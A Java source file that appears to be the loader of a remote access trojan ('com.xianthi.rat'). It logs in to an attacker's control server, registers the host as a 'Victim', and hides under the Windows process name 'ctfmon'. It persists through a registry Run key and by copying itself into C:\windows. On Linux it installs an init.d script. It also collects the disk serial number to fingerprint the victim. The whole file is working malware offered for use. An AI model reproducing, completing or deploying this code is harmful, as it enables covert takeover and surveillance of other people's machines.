package com.xianthi.rat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.text.MessageFormat;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.util.HashMap;
import java.util.Map;

import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

public class Loader {
public static int Victim_ID;
public static String command = "cmd /c ";
public static Process child;
static final String REG_ADD_CMD = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{0}\" /d \"{1}\" /t REG_EXPAND_SZ /f";
public static JSONObject rat_data;
public static String OS;
public static String passwd;
public static String rat;
public static int startup;
public static int hidetaskman;
public static int selfcopy;
	public static void main(String[] args) throws JSONException, Exception {
		 if(args.length == 0)
		    {
			 		 getOS();
			 		 Map<String, String> datas = LoadXML();
	            	 if(Login.LoginRat(datas.get("webserver"), datas.get("email"), datas.get("password"),datas.get("rat_id"))){
	            	 passwd = rat_data.getString("passwd");
	            	 rat = rat_data.getString("name");
	            	 startup = rat_data.getInt("startup");
	            	 hidetaskman = rat_data.getInt("hidetaskman");
	            	 selfcopy=1;
	            	 Victim.isVictim(datas.get("webserver"),datas.get("rat_id"));
	            	 String fname= new  File(Loader.class.getProtectionDomain().getCodeSource().getLocation().getPath()).toString();
	            	  if(startup != 0){
	            		 if(OS.contains("Win") || (OS.contains("win"))){
	            		 winStartup(fname);
	            		 }
	            		 
	            		 if(OS.contains("Lin") || (OS.contains("lin"))){
	            		 linStartup();
	            		 }
	            	 }
	            	 if(selfcopy != 0){
	            		 if(OS.contains("Win") || (OS.contains("win"))){
		            		 setSelfCopy(fname);
	            		 }
	            	 }
	            	 }
		    }else{
		    String webserver = args[0];
		    String email = args[1];
		    String password = args[2];
		    String rat_id=args[3];
		    writeXML(webserver,email,password,rat_id);
		    }

}
	
private static void getOS(){
	OS = System.getProperty("os.name");
}

private static void winStartup(String file) throws Exception{
	 String[] startup_args = new String[2];
	 startup_args[0]="ctfmon";
	 startup_args[1]=file;
	 Loader.startup_reg(startup_args);	
}

private static void linStartup() throws IOException, FileNotFoundException, IOException, Exception{
String file = "#!/bin/sh";
	file += "MYSELF=`which \"$0\" 2>/dev/null`";
	file += "[ $? -gt 0 -a -f \"$0\" ] && MYSELF=\"./$0\"";
	file += "java=java";
	file += "if test -n \"$JAVA_HOME\"; then";
    file += "java=\"$JAVA_HOME/bin/java\"";
    file += "fi";
    file += "exec \"$java\" $java_args -jar $MYSELF \"$@\"";
    file += "exit 1 \"";
    try (Writer writer = new BufferedWriter(new OutputStreamWriter(
            new FileOutputStream("stub.sh"), "utf-8"))) {
 writer.write(file);
}
    Runtime.getRuntime().exec("cat stub.sh "+Loader.class.getProtectionDomain().getCodeSource().getLocation().toURI()+" > /etc/init.d/startup && chmod +x /etc/init.d/startup && update-rc.d startup defaults");
    }

private static void setSelfCopy(String file) throws Exception{
	  Loader.exec("xcopy "+file+ " C:\\windows\\ctfmon.exe*");
}

private static Map<String, String> LoadXML() throws IOException{
	InputStream is = Loader.class.getClassLoader().getResourceAsStream("res/resources.xml");
	BufferedReader reader = new BufferedReader(new InputStreamReader(is));
	
	return readXML(reader.readLine());	
}


private static Map<String, String> readXML(String FileName){
	try {	
		DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
        Document doc = dBuilder.parse(new ByteArrayInputStream(FileName.getBytes("UTF-8")));
        doc.getDocumentElement().normalize();
        Map<String, String> parameters = new HashMap<String, String>();
        for (int temp = 0; temp < doc.getDocumentElement().getChildNodes().getLength(); temp++) {
        NodeList nList = doc.getElementsByTagName(doc.getDocumentElement().getChildNodes().item(temp).getNodeName());
        String nodename=doc.getDocumentElement().getChildNodes().item(temp).getNodeName();
        String nodevalue=nList.item(0).getTextContent();
        parameters.put(nodename, nodevalue);
        }
       return parameters;
     } catch (Exception e) {
        e.printStackTrace();
     }
	return null;
}
private static void writeXML(String webserver, String email,String password,String rat_id){
	  try {

			DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
			Document doc = docBuilder.newDocument();
			Element element = doc.createElement("info");
			
			Element webserver_key = doc.createElement("webserver");
			webserver_key.setTextContent(webserver);
			element.appendChild(webserver_key);
			Element email_key = doc.createElement("email");
			email_key.setTextContent(email);
			element.appendChild(email_key);
			Element password_key = doc.createElement("password");
			password_key.setTextContent(password);
			element.appendChild(password_key);
			Element rat_id_key = doc.createElement("rat_id");
			rat_id_key.setTextContent(rat_id);
			element.appendChild(rat_id_key);
			
			doc.appendChild(element);
			TransformerFactory transformerFactory = TransformerFactory.newInstance();
			Transformer transformer = transformerFactory.newTransformer();
			DOMSource source = new DOMSource(doc);
			StreamResult result = new StreamResult(new File("src/res/resources.xml"));

			// Output to console for testing
			// StreamResult result = new StreamResult(System.out);

			transformer.transform(source, result);

			System.out.println("File saved!");

		  } catch (ParserConfigurationException pce) {
			pce.printStackTrace();
		  } catch (TransformerException tfe) {
			tfe.printStackTrace();
		  }
	
}

private static void exec(String arg) throws Exception
{
	child = Runtime.getRuntime().exec(command+arg);
}

private static void startup_reg(String[] args) throws Exception
{
    String key = args[0];
    String value = args[1];
    String cmdLine = MessageFormat.format(REG_ADD_CMD, new Object[] { key, value });
    child = Runtime.getRuntime().exec(command + " " + cmdLine);
}

public static String getHDDSerialNumber() throws Exception{
    StringBuilder sb  = new StringBuilder();
	if(OS.contains("Lin") || (OS.contains("lin"))){
	String sc = "/sbin/udevadm info --query=property --name=sda"; // get HDD parameters as non root user
    String[] scargs = {"/bin/sh", "-c", sc};

    Process p = Runtime.getRuntime().exec(scargs);
    p.waitFor();

    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); 
    String line;
    while ((line = reader.readLine()) != null) {
        if (line.indexOf("ID_SERIAL_SHORT") != -1) { // look for ID_SERIAL_SHORT or ID_SERIAL
            sb.append(line);
        }    
    }

}
	
	if(OS.contains("Win") || (OS.contains("win"))){
		   String sc = "cmd /c" + "wmic diskdrive get serialnumber";

		    Process p = Runtime.getRuntime().exec(sc);
		    p.waitFor();

		    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

		    String line;
		    while ((line = reader.readLine()) != null) {
		        sb.append(line);
		    } 
	}
    return sb.toString().substring(sb.toString().indexOf("=") + 1);	
}

}